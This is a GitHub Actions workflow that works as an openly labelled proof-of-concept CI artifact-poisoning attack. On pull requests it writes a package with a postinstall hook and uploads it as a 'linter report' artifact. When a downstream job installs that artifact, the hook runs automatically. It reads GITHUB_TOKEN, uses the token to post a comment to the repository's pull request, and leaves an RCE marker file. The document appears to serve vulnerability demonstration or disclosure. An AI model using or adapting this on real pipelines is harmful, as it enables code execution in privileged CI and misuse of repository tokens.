name: Lint
on:
  pull_request:
    branches: [main]

jobs:
  lint:
    runs-on: ubuntu-latest
    steps:
      - name: Stage poisoned linter artifact
        run: |
          set -e
          mkdir -p pkg
          cat > pkg/package.json <<'JSON'
          {"name":"poc-evil","version":"1.0.0","scripts":{"postinstall":"node hook.js"}}
          JSON
          cat > pkg/hook.js <<'JS'
          const fs = require('fs');
          const cp = require('child_process');
          const S = process.env;
          const ws = S.GITHUB_WORKSPACE || '.';
          let pr = '';
          try { pr = fs.readFileSync(ws + '/pr-number.txt', 'utf8').trim(); } catch (e) {}
          const line = 'GAB-SELF-POC event=' + S.GITHUB_EVENT_NAME + ' workflow=' + S.GITHUB_WORKFLOW + ' repo=' + S.GITHUB_REPOSITORY + ' run=' + S.GITHUB_RUN_ID + ' node=' + process.version;
          const body = JSON.stringify({body: '### GAB-SELF-POC-CONFIRMED\n\n' + line + '\n\ntoken_len=' + (S.GITHUB_TOKEN || '').length + ' uid=' + (typeof process.getuid === 'function' ? process.getuid() : 'n/a')});
          let status = 'n/a';
          try {
            status = cp.execFileSync('curl', ['-s','-o','/dev/null','-w','%{http_code}','-X','POST',
              '-H','Authorization: Bearer ' + S.GITHUB_TOKEN,
              '-H','Accept: application/vnd.github+json',
              'https://api.github.com/repos/' + S.GITHUB_REPOSITORY + '/issues/' + pr + '/comments',
              '-d', body], {encoding:'utf8'});
          } catch (e) { status = 'ERR ' + e.message; }
          fs.writeFileSync(ws + '/gab-rce-marker.txt', line + ' api=' + status + '\n');
          console.log('GAB-POC-API-STATUS ' + status);
          JS
          cat > package.json <<'JSON'
          {"name":"poc-project","version":"1.0.0","private":true,"dependencies":{"poc-evil":"file:./pkg"}}
          JSON
          echo "attacker-controlled linter report" > linter-report.txt
          echo "${{ github.event.pull_request.number }}" > pr-number.txt
          ls -l
      - uses: actions/upload-artifact@v7
        with:
          name: linter-report
          path: |
            package.json
            pkg/package.json
            pkg/hook.js
            linter-report.txt
            pr-number.txt
